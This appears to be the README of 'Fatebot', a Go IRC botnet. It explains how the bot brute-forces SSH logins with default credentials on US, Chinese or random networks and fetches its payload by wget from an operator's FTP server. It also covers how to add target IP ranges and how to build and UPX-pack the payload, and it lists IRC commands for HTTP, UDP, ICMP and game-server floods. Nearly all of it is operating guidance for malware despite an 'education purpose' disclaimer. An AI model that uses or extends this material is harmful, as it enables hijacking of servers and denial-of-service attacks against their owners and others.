# Fatebot
This is my first <strong>IRC botnet</strong> for launch Denial of Service attack. Scan target are anything that run linux, open default SSH port, use default username and password. This bot are write in "Go" language. <strong>For education purpose only. Please test it in your lab, i create this for join university in the future not for attack anyone server with out any permission!!!</strong>

<br>Develop by Bozer\Bulldozer (old name is R4bin) feel free to do anything with it, read more detail in license.</br>
<br><ins>If you have an issue please understand that some of them i can't answer because it will make me have a trouble with cyber law.</ins></br>

<img src="assets/FateBot.png" alt="Fatebot" width="400" height="400">

# Infect
The infect function of this bot is scan by default SSH port. Option about scan feature in this bot is scan on USA or CN network or you can do a random scan or even you can add you own mods like russia or india isp mods, all of these it's up to you. This bot will Brute-force attack to the target and use <strong>"wget"</strong> for download the payload from FTP server, so... please prepair your FTP server first it's very important for the infect process. <strong>(You can use any option any server type that can host the payload not maintionly to be an FTP server.)</strong>

# Add more network

(1) Go to "scan.go" file in pkg folder. Add your new network in to the group of varible.

		var_name = "123." // 123.0.0.0/8
		or
		var_name = "123.12" // 123.12.0.0/16
		
(2) Create slice of your network.

	Example:
	
		var UK_netList = []string{
			uk1, uk2, uk3, uk4, uk5,
		}

(3) Go to "nextIP" function, add the case for your network IP and then return a range of your network IP.

		case var_name:
				return bot.manageRange(genRange(255, 0)) //max and min
				
(3.1) In case of the IP that you don't want to custom your second network prefix.
	
	Example:
	
		var_name = "123.12"
		var_name = "123.20"
		
	#The IP that look like this it will return range of the id since 0 - 255 by default.
	#That's mean you don't need to add a case in "nextIP" function for your IP.
	

(4) Then go down to the "ScanMode" function and add the case of your network and custom the command.
	
	Example:
		
		case modes == "-uk": //custom your command.
			bot.Scanner(UK_netList, false) //just config the first argument to your network.
		
<strong>I use shodan to do a static and analysis of scanning like how many of SSH port are open on which isp/org, what is the most used OS, version and etc.</strong>

# DDoS
Raw socket programming is really hard for me. That's why all of <strong>The volumetric</strong> are a simple like udp and icmp flood.
Main DDoS function is on <strong>The volumetric layer</strong>.


<img src="assets/udpflood.png" alt="udp flood, dos example">

# Build payload

	chmod +x build.sh
	./build.sh <payload>
	
	#Tip: You can download upx packer to make your payload have a smaller size. It's not help much but it's really useful.
	
	Redhat:
		yum install upx -y && upx -9 bin/<payload>
		
	Debian:
		apt install upx -y && upx -9 bin/<payload>
		
# Requirements
<li>IRC server</li>
<li>IRC backup server <strong>(Optional)</strong></li>
<li>IRC client</li>
<li>FTP server <strong>(Optional)</strong></li>
<li>Go compiler</li>
<li>UPX packer <strong>(Optional)</strong></li>

# IRC Commands

	?get 	<url>			Flood HTTP get request to target. Shouldn't have "/" end of The url!!!
	?post 	<url>			Flood HTTP post request to target. Shouldn't have "/" end of The url!!!
	?udp 	<ip> <size>		Flood UDP packets by random src and dst port to target. Min and Max of buffer is 100 - 700bytes.
	?icmp 	<ip>			Flood ICMP with large packets to target.
	?vse 	<ip>			Flood TSource Engine Query request on valve source engine dst port, By random src port to the target server that used to host online games.
	?scan 	<modes> <ftp>		Scan SSH port on the network, Brute-Force attack to the target and load the payload by "wget".
	
	Scanner modes:
	
		-cn		Scan on china network. 
		-usa		Scan on united state of america network. 
		-r		Scan with random ip. 	
		
	?info				Get bot system information, for bot analysis.
	?kill				Bot self-close.
	?stopddos 			Stop ddos attacking.
	?stopscan			Stop scanning.
